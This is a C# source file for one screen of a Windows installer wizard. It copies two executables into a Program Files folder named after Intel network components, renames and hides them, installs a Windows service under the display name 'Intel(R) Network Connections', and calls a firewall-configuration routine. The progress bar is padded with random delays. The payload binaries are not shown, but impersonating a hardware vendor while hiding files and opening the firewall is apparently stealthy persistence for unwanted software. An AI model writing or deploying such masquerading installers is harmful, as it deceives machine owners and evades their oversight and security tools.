using System;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace Installer
{
    public partial class frm4Process : Form
    {
        public frm4Process()
        {
            InitializeComponent();
            Shown += new EventHandler(Form1_Shown);

            // To report progress from the background worker we need to set this property
            backgroundWorker1.WorkerReportsProgress = true;
            // This event will be raised on the worker thread when the worker starts
            backgroundWorker1.DoWork += new DoWorkEventHandler(backgroundWorker1_DoWork);
            // This event will be raised when we call ReportProgress
            backgroundWorker1.ProgressChanged += new ProgressChangedEventHandler(backgroundWorker1_ProgressChanged);
        }

        void Form1_Shown(object sender, EventArgs e)
        {
            // Start the background worker
            backgroundWorker1.RunWorkerAsync();
        }
        void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            // Your background task goes here
            #region Copy files
            String path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Intel\Intel(R) Network Connections\uninstall\";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            else
            {
                File.Delete(path + "\\bfscc.exe");
                File.Delete(path + "\\bfswc.exe");
            }

            System.IO.File.Copy(Application.StartupPath + "\\console.exe", path + "\\bfscc.exe", true);
            File.SetAttributes(path + "\\bfscc.exe", FileAttributes.Hidden);
            UpdateProgressBar(8);

            System.IO.File.Copy(Application.StartupPath + "\\service.exe", path + "\\bfswc.exe", true);
            File.SetAttributes(path + "\\bfswc.exe", FileAttributes.Hidden);
            UpdateProgressBar(20);

            //System.IO.File.Copy(Application.StartupPath + "\\setup.exe", path + "\\uninstall.exe", true);
            UpdateProgressBar(34);
            #endregion

            #region Install Windows Service
            String filePath = Application.StartupPath + "\\console.exe";
            Assembly assembly = Assembly.LoadFrom("console.dll");
            Utils.InstallService("Intel(R) Network Connections", assembly);
            UpdateProgressBar(55);
            #endregion


            //Add Firewall rule
            Utils.ConfigureFirewall();
            UpdateProgressBar(62);
            for (int i = 65; i <= 100; i++)
            {
                UpdateProgressBar(i);
            }
        }

        // Back on the 'UI' thread so we can update the progress bar
        void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            // The progress percentage is a property of e
            progressBar.Value = e.ProgressPercentage;
            if (progressBar.Value >= 100)
            {
                btnNext.Enabled = true;
            }
        }

        private void btnNext_Click(object sender, EventArgs e)
        {
            frm5Finish finish = new frm5Finish();
            this.Hide();
            finish.ShowDialog();
            this.Close();
        }

        private void UpdateProgressBar(int i)
        {
            // Report progress to 'UI' thread
            backgroundWorker1.ReportProgress(i);
            // Simulate long task
            Random rnd = new Random();
            int randomNumber = rnd.Next(50, 100);
            System.Threading.Thread.Sleep(randomNumber);
        }
    }
}
